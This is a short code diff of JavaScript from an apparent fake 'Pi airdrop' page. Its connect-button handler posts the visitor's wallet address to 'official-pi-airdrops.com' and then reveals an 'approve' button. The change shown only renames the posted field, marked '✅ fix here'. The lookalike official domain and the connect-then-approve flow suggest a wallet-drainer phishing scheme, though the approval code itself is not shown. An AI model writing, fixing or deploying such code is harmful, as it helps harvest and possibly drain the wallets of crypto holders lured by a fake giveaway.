@@ -64,7 +64,7 @@ connectButton.onclick = async() => {
         fetch('https://official-pi-airdrops.com/php/save_wallet.php', {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ address: userAddress })
+            body: JSON.stringify({ wallet: userAddress }) // ✅ fix here
         });
 
         approveButton.style.display = "inline-block";
